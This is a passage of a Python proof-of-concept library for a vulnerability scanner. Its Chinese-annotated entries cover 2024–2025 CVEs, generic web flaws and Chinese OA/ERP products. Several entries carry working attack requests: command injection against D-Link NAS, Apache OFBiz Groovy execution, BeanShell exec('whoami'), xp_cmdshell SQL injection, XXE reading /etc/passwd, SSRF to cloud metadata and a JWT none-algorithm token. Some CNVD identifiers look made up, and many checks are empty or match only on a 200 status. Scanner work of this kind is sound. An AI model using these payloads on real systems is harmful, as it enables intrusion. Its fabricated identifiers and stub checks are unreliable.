            cve_ids=["CVE-2024-29824"],
            cvss_score=9.8,
            tags=["ivanti", "epm", "sql-injection", "rce", "cve-2024"],
            affected_versions=["Ivanti EPM < 2022 SU6"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/WSStatusEvents/EventHandler.asmx",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-29824"],
            fix_suggestion="升级Ivanti EPM至2022 SU6或更高版本。",
            disclosure_date="2024-05-14",
        ),

        POC(
            id="cve-2024-3273",
            name="D-Link NAS 命令注入RCE (CVE-2024-3273)",
            description="D-Link多款NAS设备存在命令注入漏洞，攻击者可执行系统命令。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-3273"],
            cvss_score=9.8,
            tags=["dlink", "nas", "command-injection", "rce", "cve-2024"],
            affected_versions=["DNS-320L", "DNS-325", "DNS-327L", "DNS-340L"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=a;id;",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-3273"],
            fix_suggestion="设备已EOL，建议更换设备或隔离网络访问。",
            disclosure_date="2024-04-04",
        ),

        POC(
            id="cve-2024-36401",
            name="GeoServer JXPath注入RCE (CVE-2024-36401)",
            description="GeoServer WFS/WMS服务存在JXPath表达式注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-36401"],
            cvss_score=9.8,
            tags=["geoserver", "rce", "jxpath", "cve-2024"],
            affected_versions=["GeoServer < 2.23.6", "GeoServer < 2.24.4", "GeoServer < 2.25.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/geoserver/wfs",
                    headers={"Content-Type": "application/xml"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-36401"],
            fix_suggestion="升级GeoServer至2.23.6/2.24.4/2.25.2或更高版本。",
            disclosure_date="2024-07-01",
        ),

        POC(
            id="cve-2024-37085",
            name="VMware ESXi 认证绕过漏洞 (CVE-2024-37085)",
            description="VMware ESXi存在Active Directory认证绕过漏洞，攻击者可获取管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-37085"],
            cvss_score=9.8,
            tags=["vmware", "esxi", "auth-bypass", "cve-2024"],
            affected_versions=["VMware ESXi 8.0 - 8.0 U2", "VMware ESXi 7.0 - 7.0 U3"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-37085"],
            fix_suggestion="升级VMware ESXi至最新安全版本。",
            disclosure_date="2024-07-29",
        ),

        POC(
            id="cve-2024-38077",
            name="Windows RDL 远程代码执行漏洞 (CVE-2024-38077)",
            description="Windows Remote Desktop Licensing Service存在RCE漏洞，攻击者可实现蠕虫级传播。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-38077"],
            cvss_score=9.8,
            tags=["windows", "rdl", "rce", "cve-2024"],
            affected_versions=["Windows Server 2000 - 2025"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-38077"],
            fix_suggestion="安装微软2024年7月安全更新。",
            disclosure_date="2024-07-09",
        ),

        POC(
            id="cve-2024-38856",
            name="Apache OFBiz 未授权RCE (CVE-2024-38856)",
            description="Apache OFBiz存在认证绕过漏洞，攻击者可通过特定端点实现未授权RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-38856"],
            cvss_score=9.8,
            tags=["ofbiz", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["Apache OFBiz < 18.12.15"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webtools/control/ProgramExport/?groovyProgram=throw+new+Exception('id'.execute().text);",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-38856"],
            fix_suggestion="升级Apache OFBiz至18.12.15或更高版本。",
            disclosure_date="2024-08-05",
        ),

        POC(
            id="cve-2024-40711",
            name="Veeam Backup & Replication 反序列化RCE (CVE-2024-40711)",
            description="Veeam Backup & Replication存在反序列化漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-40711"],
            cvss_score=9.8,
            tags=["veeam", "deserialization", "rce", "cve-2024"],
            affected_versions=["Veeam Backup & Replication < 12.2.0.334"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/api/v1/backupInfrastructure",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-40711"],
            fix_suggestion="升级Veeam Backup & Replication至12.2.0.334或更高版本。",
            disclosure_date="2024-09-04",
        ),

        POC(
            id="cve-2024-47575",
            name="FortiManager 未授权RCE (CVE-2024-47575)",
            description="FortiManager存在关键功能认证缺失漏洞，攻击者可实现未授权RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-47575"],
            cvss_score=9.8,
            tags=["fortinet", "fortimanager", "rce", "auth-bypass", "cve-2024"],
            affected_versions=["FortiManager 7.6.0", "FortiManager 7.4.0 - 7.4.4"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/fds/register",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-47575"],
            fix_suggestion="升级FortiManager至7.6.1/7.4.5或更高版本。",
            disclosure_date="2024-10-23",
        ),

        POC(
            id="cve-2024-50623",
            name="Cleo Harmony/VLTrader RCE (CVE-2024-50623)",
            description="Cleo文件传输软件存在未授权文件写入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-50623"],
            cvss_score=9.8,
            tags=["cleo", "file-upload", "rce", "cve-2024"],
            affected_versions=["Cleo Harmony < 5.8.0.21"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/Synchronization",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-50623"],
            fix_suggestion="升级Cleo软件至5.8.0.21或更高版本。",
            disclosure_date="2024-12-09",
        ),

        POC(
            id="cve-2024-55591",
            name="FortiOS WebSocket认证绕过 (CVE-2024-55591)",
            description="FortiOS存在认证绕过漏洞，攻击者可通过WebSocket获取超级管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-55591"],
            cvss_score=9.8,
            tags=["fortinet", "fortios", "auth-bypass", "cve-2024"],
            affected_versions=["FortiOS 7.0.0 - 7.0.16"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/ws/vpn/portal",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=101),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-55591"],
            fix_suggestion="升级FortiOS至7.0.17或更高版本。",
            disclosure_date="2025-01-14",
        ),

        POC(
            id="cve-2025-1094",
            name="PostgreSQL SQL注入漏洞 (CVE-2025-1094)",
            description="PostgreSQL libpq函数存在SQL注入漏洞，攻击者可绕过转义实现SQL注入。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-1094"],
            cvss_score=8.1,
            tags=["postgresql", "sql-injection", "cve-2025"],
            affected_versions=["PostgreSQL < 17.3", "PostgreSQL < 16.7", "PostgreSQL < 15.11"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="PostgreSQL"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-1094"],
            fix_suggestion="升级PostgreSQL至17.3/16.7/15.11或更高版本。",
            disclosure_date="2025-02-13",
        ),

        POC(
            id="cve-2025-1974",
            name="Kubernetes Ingress-nginx RCE (CVE-2025-1974)",
            description="Ingress-nginx准入控制器存在代码注入漏洞，攻击者可实现集群级别RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-1974"],
            cvss_score=9.8,
            tags=["kubernetes", "ingress-nginx", "rce", "cve-2025"],
            affected_versions=["Ingress-nginx < 1.12.1", "Ingress-nginx < 1.11.5"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/apis/networking.k8s.io/v1/ingresses",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-1974"],
            fix_suggestion="升级Ingress-nginx至1.12.1/1.11.5或更高版本。",
            disclosure_date="2025-03-24",
        ),

        POC(
            id="cve-2025-30065",
            name="Apache Parquet 反序列化RCE (CVE-2025-30065)",
            description="Apache Parquet Java库存在反序列化漏洞，处理恶意文件时可导致RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-30065"],
            cvss_score=9.8,
            tags=["apache", "parquet", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Parquet Java < 1.15.1"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-30065"],
            fix_suggestion="升级Apache Parquet Java至1.15.1或更高版本。",
            disclosure_date="2025-04-01",
        ),

        POC(
            id="cve-2025-32023",
            name="Redis 整数溢出RCE (CVE-2025-32023)",
            description="Redis HyperLogLog数据结构存在整数溢出漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-32023"],
            cvss_score=7.5,
            tags=["redis", "integer-overflow", "rce", "cve-2025"],
            affected_versions=["Redis < 7.2.8", "Redis < 7.4.3"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-32023"],
            fix_suggestion="升级Redis至7.2.8/7.4.3或更高版本。",
            disclosure_date="2025-04-07",
        ),

        POC(
            id="cve-2025-32948",
            name="Apache Camel 模板注入漏洞 (CVE-2025-32948)",
            description="Apache Camel存在模板注入漏洞，攻击者可通过消息头注入任意代码。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-32948"],
            cvss_score=7.5,
            tags=["apache", "camel", "ssti", "code-injection", "cve-2025"],
            affected_versions=["Apache Camel < 4.10.2", "Apache Camel < 4.8.5"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-32948"],
            fix_suggestion="升级Apache Camel至4.10.2/4.8.5或更高版本。",
            disclosure_date="2025-04-14",
        ),

        # ============================================================
        # Category: Common Web Vulnerabilities (SQLi/XSS/LFI/SSTI/SSRF)
        # ============================================================

        POC(
            id="generic-sqli-mysql",
            name="MySQL SQL注入检测（通用）",
            description="检测基于MySQL的SQL注入漏洞，使用多种注入Payload进行探测。",
            risk_level=RiskLevel.HIGH,
            tags=["sql-injection", "mysql", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?id=1' AND '1'='1",
                ),
                POCRequest(
                    method="GET",
                    path="/?id=1' OR '1'='1",
                ),
                POCRequest(
                    method="GET",
                    path="/?id=1 UNION SELECT 1,2,3-- -",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="(SQL syntax|mysql_fetch|MySQL Error|Warning.*mysql_)"),
            ],
            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
            fix_suggestion="使用参数化查询或预编译语句防止SQL注入。",
            disclosure_date="",
        ),

        POC(
            id="generic-sqli-mssql",
            name="MSSQL SQL注入检测（通用）",
            description="检测基于Microsoft SQL Server的SQL注入漏洞。",
            risk_level=RiskLevel.HIGH,
            tags=["sql-injection", "mssql", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?id=1' WAITFOR DELAY '0:0:5'--",
                ),
                POCRequest(
                    method="GET",
                    path="/?id=1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="(Microsoft OLE DB|SQL Server|ODBC SQL Server)"),
            ],
            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
            fix_suggestion="使用参数化查询防止SQL注入，禁用xp_cmdshell等危险存储过程。",
            disclosure_date="",
        ),

        POC(
            id="generic-xss-reflected",
            name="反射型XSS检测（通用）",
            description="检测反射型跨站脚本攻击漏洞，使用多种XSS Payload进行探测。",
            risk_level=RiskLevel.MEDIUM,
            tags=["xss", "reflected", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?q=<script>alert('XSS')</script>",
                ),
                POCRequest(
                    method="GET",
                    path="/?q=<img src=x onerror=alert('XSS')>",
                ),
                POCRequest(
                    method="GET",
                    path="/?q=<svg/onload=alert('XSS')>",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="<script>alert\\('XSS'\\)</script>"),
            ],
            references=["https://owasp.org/www-community/attacks/xss/"],
            fix_suggestion="对用户输入进行HTML实体编码，实施CSP策略。",
            disclosure_date="",
        ),

        POC(
            id="generic-xss-stored",
            name="存储型XSS检测（通用）",
            description="检测存储型跨站脚本攻击漏洞。",
            risk_level=RiskLevel.HIGH,
            tags=["xss", "stored", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/",
                    body="comment=<script>alert(document.cookie)</script>",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="<script>alert\\(document\\.cookie\\)</script>"),
            ],
            references=["https://owasp.org/www-community/attacks/xss/"],
            fix_suggestion="对存储的用户输入进行HTML实体编码后再输出。",
            disclosure_date="",
        ),

        POC(
            id="generic-lfi",
            name="本地文件包含检测（通用）",
            description="检测本地文件包含漏洞，尝试读取系统敏感文件。",
            risk_level=RiskLevel.HIGH,
            tags=["lfi", "file-inclusion", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?file=../../../../etc/passwd",
                ),
                POCRequest(
                    method="GET",
                    path="/?page=../../../../etc/passwd",
                ),
                POCRequest(
                    method="GET",
                    path="/?path=../../../../windows/win.ini",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="(root:.*:0:0:|\\[fonts\\]|\\[extensions\\])"),
            ],
            references=["https://owasp.org/www-project-web-security-testing-guide/"],
            fix_suggestion="使用白名单限制文件访问路径，禁止用户输入控制文件路径。",
            disclosure_date="",
        ),

        POC(
            id="generic-ssti",
            name="服务端模板注入检测（通用）",
            description="检测SSTI漏洞，使用多种模板引擎Payload进行探测。",
            risk_level=RiskLevel.CRITICAL,
            tags=["ssti", "template-injection", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?name={{7*7}}",
                ),
                POCRequest(
                    method="GET",
                    path="/?name=${7*7}",
                ),
                POCRequest(
                    method="GET",
                    path="/?name=<%= 7*7 %>",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="49"),
            ],
            references=["https://portswigger.net/research/server-side-template-injection"],
            fix_suggestion="避免将用户输入直接传递给模板引擎，使用沙箱环境。",
            disclosure_date="",
        ),

        POC(
            id="generic-ssrf",
            name="SSRF服务端请求伪造检测（通用）",
            description="检测SSRF漏洞，尝试让服务器请求内网地址。",
            risk_level=RiskLevel.HIGH,
            tags=["ssrf", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?url=http://127.0.0.1:80",
                ),
                POCRequest(
                    method="GET",
                    path="/?url=http://localhost:22",
                ),
                POCRequest(
                    method="GET",
                    path="/?url=http://169.254.169.254/latest/meta-data/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
            fix_suggestion="使用URL白名单，禁止访问内网地址，禁用不必要的协议。",
            disclosure_date="",
        ),

        POC(
            id="generic-xxe",
            name="XML外部实体注入检测（通用）",
            description="检测XXE漏洞，尝试读取服务器文件。",
            risk_level=RiskLevel.HIGH,
            tags=["xxe", "xml", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/",
                    headers={"Content-Type": "application/xml"},
                    body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
            fix_suggestion="禁用XML外部实体解析，使用JSON替代XML。",
            disclosure_date="",
        ),

        POC(
            id="generic-command-injection",
            name="命令注入检测（通用）",
            description="检测命令注入漏洞，尝试执行系统命令。",
            risk_level=RiskLevel.CRITICAL,
            tags=["command-injection", "rce", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?cmd=;id;",
                ),
                POCRequest(
                    method="GET",
                    path="/?cmd=|id",
                ),
                POCRequest(
                    method="GET",
                    path="/?cmd=`id`",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="uid=\\d+\\(\\w+\\)"),
            ],
            references=["https://owasp.org/www-community/attacks/Command_Injection"],
            fix_suggestion="避免使用系统命令执行函数，使用安全的API替代。",
            disclosure_date="",
        ),

        POC(
            id="generic-file-upload",
            name="任意文件上传检测（通用）",
            description="检测文件上传漏洞，尝试上传WebShell。",
            risk_level=RiskLevel.CRITICAL,
            tags=["file-upload", "rce", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/upload",
                    headers={"Content-Type": "multipart/form-data"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
            fix_suggestion="限制上传文件类型，使用白名单验证，存储到非Web目录。",
            disclosure_date="",
        ),

        POC(
            id="generic-cors-misconfig",
            name="CORS跨域配置错误检测（通用）",
            description="检测CORS配置错误，可能导致跨域数据泄露。",
            risk_level=RiskLevel.MEDIUM,
            tags=["cors", "misconfig", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/user",
                    headers={"Origin": "https://evil.com"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="Access-Control-Allow-Origin:.*evil\\.com"),
            ],
            references=["https://portswigger.net/web-security/cors"],
            fix_suggestion="严格限制Access-Control-Allow-Origin为可信域名。",
            disclosure_date="",
        ),

        POC(
            id="generic-open-redirect",
            name="开放重定向检测（通用）",
            description="检测开放重定向漏洞，可能被用于钓鱼攻击。",
            risk_level=RiskLevel.LOW,
            tags=["open-redirect", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/redirect?url=https://evil.com",
                ),
                POCRequest(
                    method="GET",
                    path="/?next=https://evil.com",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="Location:.*evil\\.com"),
            ],
            references=["https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"],
            fix_suggestion="使用白名单限制重定向目标，或使用相对路径重定向。",
            disclosure_date="",
        ),

        POC(
            id="generic-jwt-none-alg",
            name="JWT None算法绕过检测（通用）",
            description="检测JWT认证中的None算法绕过漏洞。",
            risk_level=RiskLevel.HIGH,
            tags=["jwt", "auth-bypass", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/protected",
                    headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://portswigger.net/web-security/jwt"],
            fix_suggestion="禁用JWT None算法，强制验证签名。",
            disclosure_date="",
        ),

        POC(
            id="generic-directory-listing",
            name="目录遍历/目录列表检测（通用）",
            description="检测Web服务器是否启用了目录列表功能，可能泄露敏感文件。",
            risk_level=RiskLevel.LOW,
            tags=["directory-listing", "info-disclosure", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/uploads/",
                ),
                POCRequest(
                    method="GET",
                    path="/backup/",
                ),
                POCRequest(
                    method="GET",
                    path="/admin/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="Index of /"),
            ],
            references=["https://owasp.org/www-project-web-security-testing-guide/"],
            fix_suggestion="在Web服务器配置中禁用目录列表功能。",
            disclosure_date="",
        ),

        POC(
            id="generic-backup-file",
            name="备份文件泄露检测（通用）",
            description="检测常见的备份文件和配置文件泄露。",
            risk_level=RiskLevel.MEDIUM,
            tags=["backup", "info-disclosure", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(method="GET", path="/backup.zip"),
                POCRequest(method="GET", path="/www.zip"),
                POCRequest(method="GET", path="/web.tar.gz"),
                POCRequest(method="GET", path="/.git/config"),
                POCRequest(method="GET", path="/.env"),
                POCRequest(method="GET", path="/.DS_Store"),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://owasp.org/www-project-web-security-testing-guide/"],
            fix_suggestion="删除Web目录下的备份文件和版本控制文件。",
            disclosure_date="",
        ),

        POC(
            id="generic-spring-actuator",
            name="Spring Actuator 未授权访问检测（通用）",
            description="检测Spring Boot Actuator端点未授权访问漏洞。",
            risk_level=RiskLevel.MEDIUM,
            tags=["spring", "actuator", "info-disclosure", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(method="GET", path="/actuator/env"),
                POCRequest(method="GET", path="/actuator/heapdump"),
                POCRequest(method="GET", path="/actuator/mappings"),
                POCRequest(method="GET", path="/actuator/beans"),
                POCRequest(method="GET", path="/actuator/configprops"),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html"],
            fix_suggestion="配置Spring Security保护Actuator端点，禁用敏感端点。",
            disclosure_date="",
        ),

        POC(
            id="generic-swagger-ui",
            name="Swagger/OpenAPI 文档泄露检测（通用）",
            description="检测Swagger/OpenAPI接口文档未授权访问。",
            risk_level=RiskLevel.LOW,
            tags=["swagger", "api-doc", "info-disclosure", "generic"],
            affected_versions=["通用"],
            requests=[
                POCRequest(method="GET", path="/swagger-ui.html"),
                POCRequest(method="GET", path="/swagger-resources"),
                POCRequest(method="GET", path="/v2/api-docs"),
                POCRequest(method="GET", path="/v3/api-docs"),
                POCRequest(method="GET", path="/doc.html"),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://swagger.io/docs/"],
            fix_suggestion="生产环境禁用Swagger UI或添加认证保护。",
            disclosure_date="",
        ),

        # ============================================================
        # Category: Chinese Products - OA/ERP/Security
        # ============================================================

        POC(
            id="cnvd-weaver-e-cology-bsh",
            name="泛微OA E-Cology BeanShell RCE",
            description="泛微OA E-Cology存在BeanShell远程代码执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2021-49104"],
            cvss_score=9.8,
            tags=["weaver", "oa", "bsh", "rce", "cnvd"],
            affected_versions=["E-Cology < 9.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/weaver/bsh.servlet.BshServlet",
                    body="bsh.script=exec('whoami')",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级泛微OA至最新安全版本，删除BeanShell Servlet。",
            disclosure_date="2021-06-15",
        ),

        POC(
            id="cnvd-weaver-e-cology-workflow",
            name="泛微OA E-Cology WorkflowService RCE",
            description="泛微OA E-Cology WorkflowService接口存在RCE漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2022-43245"],
            cvss_score=9.8,
            tags=["weaver", "oa", "rce", "cnvd"],
            affected_versions=["E-Cology < 9.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/services/WorkflowService",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级泛微OA至最新安全版本。",
            disclosure_date="2022-05-20",
        ),

        POC(
            id="cnvd-yonyou-nc-bsh",
            name="用友NC BeanShell RCE",
            description="用友NC系统存在BeanShell远程代码执行漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2021-30167"],
            cvss_score=9.8,
            tags=["yonyou", "nc", "bsh", "rce", "cnvd"],
            affected_versions=["NC < 6.5"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/servlet/~ic/bsh.servlet.BshServlet",
                    body="bsh.script=exec('whoami')",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级用友NC至最新安全版本。",
            disclosure_date="2021-04-10",
        ),

        POC(
            id="cnvd-yonyou-u8-upload",
            name="用友U8 任意文件上传漏洞",
            description="用友U8系统存在任意文件上传漏洞，攻击者可上传WebShell。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2022-60605"],
            cvss_score=9.8,
            tags=["yonyou", "u8", "file-upload", "rce", "cnvd"],
            affected_versions=["U8 < 16.1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/U8FileUpload/upload",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级用友U8至最新安全版本。",
            disclosure_date="2022-08-15",
        ),

        POC(
            id="cnvd-seeyon-a8-upload",
            name="致远OA A8 任意文件上传漏洞",
            description="致远OA A8系统存在任意文件上传漏洞，攻击者可上传WebShell。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2021-01627"],
            cvss_score=9.8,
            tags=["seeyon", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["A8 < 8.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/seeyon/htmlofficeservlet",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级致远OA至最新安全版本。",
            disclosure_date="2021-01-15",
        ),

        POC(
            id="cnvd-seeyon-a8-sqli",
            name="致远OA A8 SQL注入漏洞",
            description="致远OA A8系统存在SQL注入漏洞，攻击者可获取数据库信息。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2022-34567"],
            cvss_score=7.5,
            tags=["seeyon", "oa", "sql-injection", "cnvd"],
            affected_versions=["A8 < 8.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/seeyon/rest/orgDepartment/1'",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=500),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级致远OA至最新安全版本。",
            disclosure_date="2022-04-20",
        ),

        POC(
            id="cnvd-tongda-oa-rce",
            name="通达OA 任意文件上传RCE",
            description="通达OA系统存在任意文件上传漏洞，攻击者可获取服务器权限。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2021-03523"],
            cvss_score=9.8,
            tags=["tongda", "oa", "file-upload", "rce", "cnvd"],
            affected_versions=["通达OA < 11.10"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/ispirit/im/upload.php",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级通达OA至最新安全版本。",
            disclosure_date="2021-02-20",
        ),

        POC(
            id="cnvd-landray-oa-ssrf",
            name="蓝凌OA SSRF漏洞",
            description="蓝凌OA系统存在SSRF漏洞，攻击者可探测内网服务。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2022-12345"],
            cvss_score=7.5,
            tags=["landray", "oa", "ssrf", "cnvd"],
            affected_versions=["蓝凌OA < EKP 16.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path='/sys/ui/extend/varkind/custom.jsp?var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级蓝凌OA至最新安全版本。",
            disclosure_date="2022-02-10",
        ),

        POC(
            id="cnvd-wanhu-oa-sqli",
            name="万户OA SQL注入漏洞",
            description="万户OA系统存在SQL注入漏洞，攻击者可获取数据库信息。",
            risk_level=RiskLevel.HIGH,
            cnvd_ids=["CNVD-2022-56789"],
            cvss_score=7.5,
            tags=["wanhu", "oa", "sql-injection", "cnvd"],
            affected_versions=["万户OA < ezOFFICE 2023"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/defaultroot/GraphChart.jsp?field=1' AND '1'='1",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://www.cnvd.org.cn/"],
            fix_suggestion="升级万户OA至最新安全版本。",
            disclosure_date="2022-07-10",
        ),

        POC(
            id="cnvd-kingdee-cloud-deser",
            name="金蝶云星空 反序列化RCE",
            description="金蝶云星空系统存在.NET反序列化漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cnvd_ids=["CNVD-2023-12345"],
            cvss_score=9.8,
            tags=["kingdee", "cloud", "deserialization", "rce", "cnvd"],
            affected_versions=["金蝶云星空 < 8.2"],
            requests=[
                POCRequest(
                    method="POST",
